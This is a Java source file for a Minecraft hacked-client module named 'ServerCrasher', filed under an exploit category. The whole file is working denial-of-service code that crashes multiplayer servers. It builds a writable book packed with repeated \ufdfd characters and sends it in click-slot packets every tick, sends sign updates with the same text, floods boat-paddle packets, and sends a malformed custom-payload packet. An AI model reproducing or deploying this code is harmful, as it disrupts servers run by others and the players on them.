package dev.tigr.ares.fabric.impl.modules.exploit;

import dev.tigr.ares.core.feature.module.Category;
import dev.tigr.ares.core.feature.module.Module;
import dev.tigr.ares.core.setting.Setting;
import dev.tigr.ares.core.setting.settings.EnumSetting;
import dev.tigr.ares.core.util.render.TextColor;
import io.netty.buffer.Unpooled;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;

/**
 * @author Tigermouthbear
 */
@Module.Info(name = "ServerCrasher", description = "Methods of crashing servers", category = Category.EXPLOIT)
public class ServerCrasher extends Module {
    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";
    private final String color = "red";
    private final Text line1 = Text.Serializer.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Text line2 = Text.Serializer.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Text line3 = Text.Serializer.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Text line4 = Text.Serializer.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final Setting<Mode> mode = register(new EnumSetting<>("Mode", Mode.BOOK));
    private ItemStack bookObj = null;

    @Override
    public void onEnable() {
        UTILS.printMessage(TextColor.RED + "Crashing...");

        if(mode.getValue() == Mode.BOOK) {
            bookObj = new ItemStack(Items.WRITABLE_BOOK);
            NbtList list = new NbtList();
            NbtCompound tag = new NbtCompound();
            String author = MC.getSession().getUsername();
            String title = "\n Woops \n";
            for(int i = 0; i < 50; ++i) {
                final NbtString tString = NbtString.of(message);
                list.add(tString);
            }
            tag.putString("author", author);
            tag.putString("title", title);
            tag.put("pages", list);
            bookObj.setSubNbt("pages", list);
            bookObj.setNbt(tag);
        } else if(mode.getValue() == Mode.INVALID_PACKET) {
            MC.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(new Identifier(message),
                    (new PacketByteBuf(Unpooled.buffer())).writeString(message)));
        }
    }

    @Override
    public void onTick() {
        if(MC.world == null) {
            setEnabled(false);
            return;
        }

        try {
            if(mode.getValue() == Mode.BOOK)
                MC.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, Int2ObjectMaps.emptyMap()));
            if(mode.getValue() == Mode.SIGN)
                MC.player.networkHandler.sendPacket(new UpdateSignC2SPacket(MC.player.getBlockPos(), line1.asString(), line2.asString(), line3.asString(), line4.asString()));
            if(mode.getValue() == Mode.NEW) {
                for(int i = 0; i < 100; i++) {
                    MC.player.networkHandler.sendPacket(new BoatPaddleStateC2SPacket(true, true));
                }
            }
            Thread.sleep(12L);
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getInfo() {
        return mode.getValue().name();
    }

    enum Mode {
        BOOK,
        SIGN,
        NEW,
        INVALID_PACKET
    }
}
